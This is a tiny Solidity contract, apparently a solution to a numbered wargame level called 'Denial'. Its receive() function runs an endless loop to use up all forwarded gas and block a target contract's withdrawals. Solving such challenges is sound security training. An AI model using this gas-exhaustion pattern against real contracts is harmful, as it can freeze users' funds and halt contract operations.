// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./interfaces/20_IDenial.sol";

contract DenialSolution {
    receive() external payable {
        while (true) {}
    }
}
